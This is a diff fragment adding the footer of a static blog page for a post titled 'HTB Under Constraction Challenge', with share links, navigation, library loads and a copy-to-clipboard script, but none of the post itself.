+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/08/04/htb-under-constraction/&title=HTB Under Constraction Challenge"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/08/04/htb-under-constraction/&name=HTB Under Constraction Challenge&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/08/04/htb-under-constraction/&t=HTB Under Constraction Challenge"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    Andy
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
